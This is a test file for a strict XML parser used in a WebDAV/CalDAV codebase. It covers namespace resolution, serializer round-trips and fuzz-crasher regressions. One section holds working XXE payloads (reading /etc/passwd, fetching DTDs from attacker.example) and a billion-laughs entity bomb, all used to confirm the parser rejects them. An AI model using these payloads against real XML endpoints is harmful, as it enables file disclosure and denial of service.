// The XML parser: what it keeps, and — the point of it — what it refuses (XXE, billion laughs, any
// DTD at all, undeclared prefixes, malformed input, oversized input).
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { NS, XmlError, childElement, childElements, parseXml, serializeXml, textContent, type XmlElement } from '../../src/index.js';

function code(f: () => unknown): string {
  try {
    f();
  } catch (err) {
    if (err instanceof XmlError) return err.code;
    throw err;
  }
  return 'accepted';
}

describe('parseXml — what it keeps', () => {
  it('resolves prefixes to namespace URIs, including the default namespace', () => {
    const root = parseXml(
      '<?xml version="1.0" encoding="UTF-8"?>\n<propfind xmlns="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav"><prop><getetag/><C:calendar-data/></prop></propfind>',
    );
    expect(root).toMatchObject({ ns: NS.DAV, local: 'propfind' });
    const prop = childElement(root, NS.DAV, 'prop');
    expect(prop && childElements(prop).map((e) => `{${e.ns}}${e.local}`)).toEqual([`{DAV:}getetag`, `{${NS.CALDAV}}calendar-data`]);
  });

  it('keeps an unprefixed attribute in no namespace, and undeclares the default with xmlns=""', () => {
    const root = parseXml('<a xmlns="urn:x" name="VEVENT"><b xmlns=""/></a>');
    expect(root.attrs).toEqual([{ ns: '', local: 'name', value: 'VEVENT' }]);
    expect((root.children[0] as XmlElement).ns).toBe('');
  });

  it('decodes the five predefined entities, character references and CDATA, and merges text', () => {
    const root = parseXml('<t>&lt;&gt;&amp;&quot;&apos; &#65;&#x42; <![CDATA[<raw & text>]]> end</t>');
    expect(root.children).toEqual(['<>&"\' AB <raw & text> end']);
  });

  it('normalises CRLF to LF but keeps a CR sent as &#13;', () => {
    expect(textContent(parseXml('<t>a\r\nb\rc&#13;&#10;d</t>'))).toBe('a\nb\nc\r\nd');
  });

  it('drops comments and processing instructions, and strips a UTF-8 BOM', () => {
    const bytes = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('<!-- hi --><?pi data?><a><!--x-->y<?q?></a><!-- after -->')]);
    expect(parseXml(bytes).children).toEqual(['y']);
  });

  it('round-trips a DAV response through the serializer', () => {
    const src = '<d:multistatus xmlns:d="DAV:"><d:response><d:href>/a%20b/</d:href><d:status>HTTP/1.1 200 OK</d:status></d:response></d:multistatus>';
    const tree = parseXml(src);
    expect(parseXml(serializeXml(tree))).toEqual(tree);
  });

  // Nightly fuzz run 36320930132 (GitHub issue #9, PST-T-4.14 / PST-REQ-088): serializeXml treated
  // NS.XML like any other namespace needing a root declaration, so a tree with an element in the
  // xml: namespace (like this calendar-multiget's <xml:setag/>, using the implicit `xml` prefix that
  // needs no xmlns:xml declaration at all) came back out with `xmlns:x0="…XML/1998/namespace"` — a
  // second prefix bound to the one namespace only `xml` may ever be bound to. Re-parsing that output
  // then threw XmlError (`the xml prefix is bound to its own namespace only`) past the fuzz target's
  // own allowed() guard, because the throw came from the round-trip parseXml call, not the first one.
  it('round-trips an element in the xml: namespace without redeclaring the xml prefix (fuzz crasher, issue #9)', () => {
    const src = readFileSync(join(import.meta.dirname, '../../../../fuzz/dav-proto/fixtures/xml-prefix-namespace-serializer-roundtrip.xml'));
    const tree = parseXml(src);
    const setag = childElement(childElement(tree, NS.DAV, 'prop') as XmlElement, NS.XML, 'setag');
    expect(setag).toBeDefined();
    const serialized = serializeXml(tree);
    expect(serialized).not.toMatch(/xmlns:\w+="http:\/\/www\.w3\.org\/XML\/1998\/namespace"/);
    expect(parseXml(serialized)).toEqual(tree);
  });

  // Nightly fuzz runs 37337228161 and 37476798363 (GitHub issue #28, PST-T-002 / PST-REQ-088): the
  // serializer looked a namespace's preferred prefix up on a plain object, so a namespace named
  // `__proto__` (or `constructor`, `toString`, …) found Object.prototype's member instead of nothing
  // and was written as `<[object Object]:propfind xmlns:[object Object]="__proto__"/>`. Re-parsing
  // that threw XmlError (`expected a name (at 40)`) from the round-trip parseXml call, past the fuzz
  // target's allowed() guard.
  it.each(['proto-namespace-propfind-roundtrip.xml', 'proto-namespace-mkcalendar-roundtrip.xml'])(
    'round-trips a namespace named __proto__ with a generated prefix (fuzz crasher %s, issue #28)',
    (fixture) => {
      const tree = parseXml(readFileSync(join(import.meta.dirname, '../../../../fuzz/dav-proto/fixtures', fixture)));
      expect(tree.ns).toBe('__proto__');
      const serialized = serializeXml(tree);
      expect(serialized).toMatch(/^<x\d+:\w+ xmlns:/m);
      expect(serialized).not.toContain('[object Object]');
      expect(parseXml(serialized)).toEqual(tree);
    },
  );

  it.each(['__proto__', 'constructor', 'toString', 'hasOwnProperty'])('gives a namespace named %s a generated prefix', (ns) => {
    const tree = parseXml(`<p:a xmlns:p="${ns}"><p:b/></p:a>`);
    const serialized = serializeXml(tree);
    expect(serialized).toContain(`<x0:a xmlns:x0="${ns}">`);
    expect(parseXml(serialized)).toEqual(tree);
  });
});

describe('parseXml — XXE and entity expansion are impossible', () => {
  it('refuses the classic XXE (external entity to a file)', () => {
    const xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><propfind xmlns="DAV:"><prop>&xxe;</prop></propfind>';
    expect(code(() => parseXml(xxe))).toBe('dtd');
  });

  it('refuses an external DTD subset and a parameter entity', () => {
    expect(code(() => parseXml('<!DOCTYPE a SYSTEM "http://attacker.example/evil.dtd"><a/>'))).toBe('dtd');
    expect(code(() => parseXml('<!DOCTYPE a [<!ENTITY % p SYSTEM "http://attacker.example/x">%p;]><a/>'))).toBe('dtd');
  });

  it('refuses billion laughs before expanding anything', () => {
    const lol =
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">' +
      Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${String(i + 1)} "${`&lol${i === 0 ? '' : String(i)};`.repeat(10)}">`).join('') +
      ']><lolz>&lol9;</lolz>';
    const started = Date.now();
    expect(code(() => parseXml(lol))).toBe('dtd');
    expect(Date.now() - started).toBeLessThan(100);
  });

  it('refuses a markup declaration inside content, and any undefined entity', () => {
    expect(code(() => parseXml('<a><!ENTITY x "y"></a>'))).toBe('dtd');
    expect(code(() => parseXml('<a>&xxe;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a b="&xxe;"/>'))).toBe('entity');
    expect(code(() => parseXml('<a>&#0;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a>&#xD800;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a>&amp</a>'))).toBe('entity');
    // Only the five predefined entities: not anything else Object.prototype happens to have (issue #28).
    for (const name of ['__proto__', 'constructor', 'toString', 'valueOf', 'hasOwnProperty']) {
      expect(code(() => parseXml(`<a>&${name};</a>`))).toBe('entity');
    }
  });
});

describe('parseXml — strictness', () => {
  it.each([
    ['<a>', 'syntax'],
    ['<a></b>', 'syntax'],
    ['<a/><b/>', 'syntax'],
    ['text<a/>', 'syntax'],
    ['', 'syntax'],
    ['<a b="1" b="2"/>', 'syntax'],
    ['<a b=1/>', 'syntax'],
    ['<a b="<"/>', 'syntax'],
    ['<a>]]></a>', 'syntax'],
    ['<a><!-- -- --></a>', 'syntax'],
    ['<a/><?xml version="1.0"?>', 'syntax'],
    ['<a>\u0001</a>', 'syntax'],
    ['<a>\uD800</a>', 'syntax'],
    ['<p:a/>', 'namespace'],
    ['<a p:b="1"/>', 'namespace'],
    ['<a xmlns:p=""/>', 'namespace'],
    ['<a xmlns:xml="urn:not-xml"/>', 'namespace'],
    ['<a xmlns:xmlns="urn:x"/>', 'namespace'],
    ['<a xmlns:p="urn:x" xmlns:q="urn:x" p:b="1" q:b="2"/>', 'namespace'],
    ['<?xml version="1.0" encoding="ISO-8859-1"?><a/>', 'encoding'],
  ])('refuses %j (%s)', (input, expected) => {
    expect(code(() => parseXml(input))).toBe(expected);
  });

  it('refuses malformed UTF-8 and UTF-16', () => {
    expect(code(() => parseXml(Buffer.from([0x3c, 0x61, 0x3e, 0xc3, 0x28, 0x3c, 0x2f, 0x61, 0x3e])))).toBe('encoding');
    expect(code(() => parseXml(Buffer.from('\uFEFF<a/>', 'utf16le')))).toBe('encoding');
  });

  it('enforces the size, depth, node and attribute limits', () => {
    expect(code(() => parseXml(`<a>${'x'.repeat(2000)}</a>`, { maxBytes: 1000 }))).toBe('limit');
    expect(code(() => parseXml(`${'<a>'.repeat(65)}${'</a>'.repeat(65)}`))).toBe('limit');
    expect(code(() => parseXml(`${'<a>'.repeat(64)}${'</a>'.repeat(64)}`))).toBe('accepted');
    expect(code(() => parseXml(`<a>${'<b/>'.repeat(20)}</a>`, { maxNodes: 10 }))).toBe('limit');
    expect(code(() => parseXml(`<a ${Array.from({ length: 70 }, (_, i) => `a${String(i)}="1"`).join(' ')}/>`))).toBe('limit');
  });

  it('parses a very deep document iteratively when the limit allows it', () => {
    const deep = `${'<a>'.repeat(20_000)}${'</a>'.repeat(20_000)}`;
    let node = parseXml(deep, { maxDepth: 30_000 });
    let depth = 1;
    while (node.children.length > 0) {
      node = node.children[0] as XmlElement;
      depth++;
    }
    expect(depth).toBe(20_000);
  });
});
